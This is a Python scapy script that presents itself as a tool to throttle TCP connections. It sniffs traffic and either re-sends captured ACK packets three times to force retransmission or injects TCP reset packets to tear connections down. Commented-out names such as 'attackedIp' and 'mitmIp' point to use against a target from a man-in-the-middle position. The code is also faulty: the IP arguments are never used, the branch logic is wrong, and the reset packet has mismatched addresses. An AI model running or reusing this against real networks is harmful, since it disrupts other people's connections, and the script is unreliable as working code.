# 1. Sending 3 duplicate ACK packets to simulate packet loss and force retransmission
# 2. Sending a TCP reset packet to drop the connection altogether.

# This tool slows down TCP transmssions. 
# It does this either by sending 3 dublicate ACK packets, simulating packets loss and forcing retransmission. 
# or sending a TCP reset packet to drop the connection altogether.

# Takes as input a source and destination IP addresses for a TCP connection 
# and the approach for throttling which should be used.

import logging
logger = logging.getLogger("scapy")
logger.setLevel(logging.CRITICAL)
# logger.setLevel(logging.INFO)

from scapy.all import *

def throttleTCP(sourceIP, destIp, throttle):
    if throttle == "dublicateACK":
        sniff(prn=retransmit_ack, count=1000) 
    if throttle == "RST":
        sniff(prn=rst, count=1000) 
    else:
        print("Select either 'dublicateACK' or 'RST' as throttle method.")
        
usedAcks = set()

def retransmit_ack(packet):
    if packet.haslayer(TCP) and packet[TCP].flags == "A":  # Checking for ACK flag
        print(f"Captured ACK Packet: {packet.summary()} with number {packet[TCP].ack}")
        incomingAck = packet[TCP].ack
        if incomingAck not in usedAcks:
            print(f"Captured new ACK Packet: {packet.summary()}")
            print(f"Ack is: {incomingAck}")
            usedAcks.add(incomingAck)
            new_packet = packet.copy()
            del new_packet[IP].chksum
            del new_packet[TCP].chksum
            sendp(new_packet, iface="enp3s0", count=3, inter=0.0)  
            print("Retransmitted ACK Packet.")

def rst(packet):
    if packet.haslayer(TCP):
        print(f"sourceIp is: {packet[IP].src}. dstIp is: {packet[IP].dst}.")
        rst_packet = IP(src=packet[IP].src, dst=packet[IP].dst) / TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags="R", seq=packet[TCP].seq, ack=packet[TCP].ack)
        sendp(rst_packet, iface="enp3s0")

def main():
    sourceIp = "192.168.0.177"
    dstIp = "192.168.0.192"

    #attackedIp = input("sourceIp: ")
    #mitmIp = input("dstIp: ")
    #throttle = input("throttle: ")
    throttleTCP(sourceIp, dstIp, "dublicateACK")
    #throttleTCP(sourceIp, dstIp, "RST")

if __name__=="__main__":
    main()